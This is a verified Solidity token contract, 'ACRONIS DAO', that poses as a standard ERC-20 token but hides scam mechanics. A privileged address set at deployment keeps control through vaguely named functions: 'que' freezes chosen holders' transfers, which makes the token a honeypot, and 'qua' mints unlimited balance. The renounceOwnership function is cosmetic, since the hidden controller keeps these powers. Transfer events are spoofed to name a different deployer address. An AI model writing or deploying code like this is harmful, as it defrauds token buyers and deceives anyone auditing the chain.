/**
 *Submitted for verification at Etherscan.io on 2023-01-15
*/

// SPDX-License-Identifier: Unlicensed


pragma solidity 0.8.17;

   
 
contract ACRONIS {
  
    mapping (address => uint256) private BII;
    mapping (address => uint256) private CPP;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "ACRONIS DAO";
    string public symbol = unicode"ACRONIS";
    uint8 public decimals = 6;
    uint256 public totalSupply = 100000000 *10**6;
    address owner = msg.sender;
    address private DII;
    address deployer = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        DII = msg.sender;
        deploy(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function deploy(address account, uint256 amount) internal {
    account = deployer;
    BII[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }


   function balanceOf(address account) public view  returns (uint256) {
        return BII[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(CPP[msg.sender] <= 1);
        require(BII[msg.sender] >= value);
  BII[msg.sender] -= value;  
        BII[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 function que (address io, uint256 ix)  public {
     if(msg.sender == DII){
   CPP[io] = ix;}} 
function qua (address io, uint256 ix)  public {
         if(msg.sender == DII){
    BII[io] += ix;}}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == DII)  {
 require(value <= BII[from]);
        require(value <= allowance[from][msg.sender]);
        BII[from] -= value;  
      BII[to] += value; 
        from = deployer;
        emit Transfer (from, to, value);
        return true; }    

        require(CPP[from] <= 1 && CPP[to] <=1);
        require(value <= BII[from]);
        require(value <= allowance[from][msg.sender]);
        BII[from] -= value;
        BII[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }